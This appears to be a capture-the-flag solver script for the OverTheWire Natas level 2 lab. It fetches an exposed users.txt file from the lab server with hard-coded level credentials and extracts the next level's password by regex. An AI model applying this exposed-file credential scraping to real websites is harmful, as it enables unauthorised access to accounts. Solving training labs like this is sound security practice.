#!/usr/bin/env python3

import requests,re,sys,signal,time,os
import base64 as b64
import html2text as h2t
from tabulate import tabulate

import natas1 as prev_level

def sig_handler(sig,frame):
  print("\n\n[+] Exiting...\n")
  sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

def make_request(user,password):
  print(f"[+] Sending request from {user}.py ...\n[+] user:{user}\n[+] passwd:{password}") 
  url = f"http://{user}.natas.labs.overthewire.org/files/users.txt"
  r = requests.get( url, auth=(user,password) )
  return r.status_code, r.text, r.cookies.get_dict(), user, password

def get_flag(req):
  flags = re.findall(r"natas3:([a-zA-Z0-9]{32})",req) # ts got changed !!!
  if flags:
    return "\n---\n".join(flags)
  return "x"


def get_password():
  status, text, cookies, user, password = make_request(f"{os.path.basename(__file__)[:-3]}",f"{prev_level.get_password()}")
  return get_flag(text)

def dbg(status,raw_html,cookies,user,password,md5s):
  
  rendered_html = h2t.html2text(raw_html)
  table_data = [
      [f"[i] Status:{status}", ""],
      [f"[i] User",f"[i] Password"],
      [f"{user}",f"{password}"],
      ["[i] Raw HTML", "[i] Rendered HTML"],
      [raw_html,rendered_html],
      ["[i] Cookies", cookies],
      ["[i] Previous Flag", password],
      ["[+] Flag for Next Level", md5s]
  ]

  print(tabulate(table_data, tablefmt="grid", maxcolwidths=[70,40]))


if __name__ == "__main__":
 
  status, text, cookies, user, password = make_request(f"{os.path.basename(__file__)[:-3]}","TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI")
  flags = get_flag(text)
  dbg(status,text,cookies,user,password,flags)


